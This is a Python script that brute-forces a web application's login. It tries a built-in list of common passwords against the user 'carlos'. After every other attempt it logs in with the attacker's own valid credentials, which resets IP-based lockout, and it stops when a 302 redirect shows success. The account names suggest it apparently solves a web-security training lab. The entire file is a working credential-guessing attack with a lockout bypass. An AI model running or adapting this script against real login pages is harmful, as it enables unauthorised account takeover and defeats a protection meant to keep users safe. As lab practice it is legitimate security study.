import requests
import sys

url = "" if len(sys.argv)<2 else sys.argv[1]

def main():
    checkParams()

    victimUsername = "carlos"
    passList = getPassList()
    myCorrectCred = {"username":"wiener", "password":"peter"}
    
    for i in range(len(passList)):
        victimCred = {"username":victimUsername, "password":passList[i]}
        
        if i%2 != 0:
            #Send a request with correct credentials so my IP won't be blocked
            requests.post(url, data = myCorrectCred, allow_redirects = False)
            
        #Bruteforce
        res = sendRequestLoggerDecorator(requests.post)(victimCred)
        
        checkPassFound(res.status_code,victimCred["password"])
      
      
def checkParams():
    if url == "":
        print("Please insert a URL")
        sys.exit(0)
        
  
def getPassList():
    passListFile = "" if len(sys.argv)<3 else sys.argv[2]
    if passListFile == "":
        passList = ["123456", "password", "12345678", "qwerty", "123456789", "12345", "1234", "111111", "1234567", "dragon", "123123", "baseball", "abc123", "football", "monkey", "letmein", "shadow", "master", "666666", "qwertyuiop", "123321", "mustang", "1234567890", "michael", "654321", "superman", "1qaz2wsx", "7777777", "121212", "000000", "qazwsx", "123qwe", "killer", "trustno1", "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster", "soccer", "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000", "charlie", "robert", "thomas", "hockey", "ranger", "daniel", "starwars", "klaster", "112233", "george", "computer", "michelle", "jessica", "pepper", "1111", "zxcvbn", "555555", "11111111", "131313", "freedom", "777777", "pass", "maggie", "159753", "aaaaaa", "ginger", "princess", "joshua", "cheese", "amanda", "summer", "love", "ashley", "nicole", "chelsea", "biteme", "matthew", "access", "yankees", "987654321", "dallas", "austin", "thunder", "taylor", "matrix", "mobilemail", "mom", "monitor", "monitoring", "montana", "moon", "moscow"]
    else:
        try:
            with open(passListFile) as f: # Open file on read mode
                passList = f.read().splitlines() # List with stripped line-breaks
        except FileNotFoundError:
                print("File not found!")
                sys.exit(0)
    return passList
    
    
def sendRequestLoggerDecorator(postFunc):
    def inner(payload):
        print(f"Sending the payload: {payload}")
        res = postFunc(url, data = payload, allow_redirects = False)
        print(f"Response status code: {res.status_code}\n")
        return res
    return inner


def checkPassFound(statusCode, password):
    #If redirects to profile page, it logged in
    if statusCode == 302:
        print("Login ok")
        print("FOUND PASSWORD: " + password)
        sys.exit(0)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print('Interrupted by user')
        sys.exit(0)